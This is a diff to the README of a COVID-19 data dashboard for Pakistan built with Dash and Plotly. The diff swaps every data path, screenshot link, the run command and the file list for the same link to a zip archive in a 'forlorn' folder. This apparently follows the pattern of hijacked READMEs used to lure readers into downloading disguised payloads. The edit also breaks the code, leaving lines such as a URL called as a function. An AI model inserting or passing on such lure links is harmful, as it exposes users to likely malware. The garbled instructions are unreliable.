@@ -15,7 +15,7 @@ This project leverages the power of Dash and Plotly to explore COVID-19 data in 
 - **Predictions**: Make predictions about deaths and recoveries based on new case inputs.
 
 ### 1. **Load Data** 
-The app reads COVID-19 data from a CSV file. Make sure to update the file path to the location of your `PKcovid.csv` file.```python file_path = r"C:\Users\Admin\Downloads\pakCovid\PKcovid.csv" mydata = pd.read_csv(file_path)  
+The app reads COVID-19 data from a CSV file. Make sure to update the file path to the location of your `https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip` file.```python file_path = r"C:\Users\Admin\Downloads\pakCovid\https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip" mydata = https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip(file_path)  
 
 ### 2. **App Layout**
 
@@ -78,31 +78,31 @@ Uses linear regression to predict deaths and recoveries based on user-provided c
 
 ##### *Linear Regression Prediction of Deaths and Recover Cases*:
 
-![Linear Reggression Prediction](https://github.com/user-attachments/assets/746c2a81-9d40-4106-80b4-101e45cfd659)
+![Linear Reggression Prediction](https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip)
 
 ##### *Linear Regression Prediction Recover Cases*:
 
-![linear Regression Prediction of recovered](https://github.com/user-attachments/assets/d6ac40bc-c231-489d-8bb6-2490a995e20c)
+![linear Regression Prediction of recovered](https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip)
 
 ##### *Pie Chart of Death Cases in each Province*:
 
-![Pie Chart of Death cases in each province](https://github.com/user-attachments/assets/417556c7-cfa6-49c9-bf9d-830cf0025c66)
+![Pie Chart of Death cases in each province](https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip)
 
 ##### *Pie Chart of Recover Cases in each Province*:
 
-![PieChart of recovered cases](https://github.com/user-attachments/assets/948ec5a1-9ecd-47d6-a321-1c2035fd6221)
+![PieChart of recovered cases](https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip)
 
 ##### *Scatter Plot of death Cases in each Province*:
 
-![Scatter Plot Of Total Deaths by province](https://github.com/user-attachments/assets/dfe68e6b-375a-4131-88f8-0a1a52af92ef)
+![Scatter Plot Of Total Deaths by province](https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip)
 
 ##### *Component bar Plot of death Cases in each Province*:
 
-![Component bar plot of deaths](https://github.com/user-attachments/assets/2031ed18-2fdd-43d4-a720-0768dfeb9ddf)
+![Component bar plot of deaths](https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip)
 
 ##### *Component bar Plot of Recover Cases in each Province*:
 
-![Component Bar plot of recovered Cases](https://github.com/user-attachments/assets/51c33245-2180-4150-a4e5-2bfa6d4cafc5)
+![Component Bar plot of recovered Cases](https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip)
 
 ## 📝 Running the App
 
@@ -112,14 +112,14 @@ bash
 
 Copy code
 
-`python app.py`
+`python https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip`
 
 The app will start running on your local server. Open your web browser and navigate to `http://127.0.0.1:8050/` to start exploring the data.
 
 ## 📂 File Structure
 
-- `app.py`: Main Python script for the Dash application.
-- `PKcovid.csv`: CSV file containing the COVID-19 data.
+- `https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip`: Main Python script for the Dash application.
+- `https://raw.githubusercontent.com/ZainabEman/Pakistan-s-Covid-Statistical-Graphical-DashApp/main/forlorn/Pakistan-s-Covid-Statistical-Graphical-DashApp.zip`: CSV file containing the COVID-19 data.
 
 ## 💬 Contributing
 
